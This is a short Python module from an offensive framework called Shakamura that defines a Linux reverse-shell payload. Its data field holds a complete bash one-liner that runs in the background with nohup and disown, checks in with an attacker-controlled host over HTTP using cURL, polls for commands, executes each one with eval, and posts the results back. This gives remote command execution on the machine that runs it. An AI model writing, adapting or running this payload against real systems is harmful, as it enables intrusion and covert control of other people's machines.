# This module is part of the Shakamura framework

class Payload:

    info = {
        'Title' : 'Linux cURL Shakamura',
        'Author' : 'Panagiotis Chartas (r0jahsm0ntar1)',
        'Description' : 'An Http based beacon-like reverse shell that utilizes cURL',
        'References' : ['https://github.com/r0jahsm0ntar1/shakamura', 'https://revshells.com']
    }

    meta = {
        'handler' : 'shakamura',
        'type' : 'sh-curl',
        'os' : 'linux',
        'shell' : 'unix'
    }

    config = {
        'frequency' : 0.8
    }

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = 'nohup bash -c \'s=*LHOST*&&i=*SESSIONID*&&hname=$(hostname)&&p=http://;curl -s "$p$s/*VERIFY*/$hname/$USER" -H "*HOAXID*: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/*GETCMD*" -H "*HOAXID*: $i")&&if [ "$c" != None ]; then r=$(eval "$c" 2>&1)&&echo $r;if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/*POSTRES* -X POST -H "*HOAXID*: $i" -d "$r";echo $$;fi; fi; sleep *FREQ*; done;\' & disown'
